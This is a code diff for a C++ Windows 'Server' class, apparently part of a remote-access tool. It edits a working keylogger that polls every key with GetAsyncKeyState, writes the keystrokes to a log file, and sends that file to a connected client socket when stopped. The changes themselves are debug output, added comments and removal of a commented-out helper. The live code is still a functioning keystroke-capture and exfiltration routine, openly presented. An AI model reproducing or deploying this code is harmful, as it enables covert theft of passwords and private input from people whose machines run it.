@@ -356,12 +356,15 @@ void Server::startKeyLogger() {
 // Function to stop keylogger and send log file to client
 void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
+    std::cout << "Setting isLogging to false to stop keylogger.\n";
+
     if (keyLoggerThread.joinable()) {
         keyLoggerThread.join();
-    }else{
+    } else {
         std::cerr << "Keylogger thread was not joinable.\n";
     }
     
+    // Send the log file to the client after stopping
     copyFileAndSend(clientSocket, logFilePath, logFilePath);
 }
 
@@ -373,11 +376,11 @@ void Server::keyLogger() {
     if (OUTPUT_FILE == nullptr) return;
 
     while (isLogging) {
-     
         Sleep(10);
+        std::cout << "Logging active...\n"; // Debug output to confirm loop entry
         for (int i = 8; i <= 255; i++) {
             if (GetAsyncKeyState(i) == -32767) {
-                std::lock_guard<std::mutex> lock(logMutex);  // Thread-safe access
+                std::lock_guard<std::mutex> lock(logMutex);
                 switch (i) {
                     case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
                     case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
@@ -389,30 +392,12 @@ void Server::keyLogger() {
                     case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
                     default: fprintf(OUTPUT_FILE, "%c", i); break;
                 }
-                fflush(OUTPUT_FILE);  // Flush to ensure data is written immediately
+                fflush(OUTPUT_FILE);
             }
         }
     }
- 
+    std::cout << "Logging stopped.\n"; // Indicates that logging stopped properly
     fclose(OUTPUT_FILE);
 }
 
-// Save the key to the log file
-// int Server::saveKey(int _key, const char* file) {
-   
 
-//     switch (_key) {
-//         case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
-//         case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
-//         case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
-//         case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
-//         case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
-//         case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
-//         case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
-//         case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
-//         default: fprintf(OUTPUT_FILE, "%c", _key); break;
-//     }
-
-//     fclose(OUTPUT_FILE);
-//     return 0;
-// }
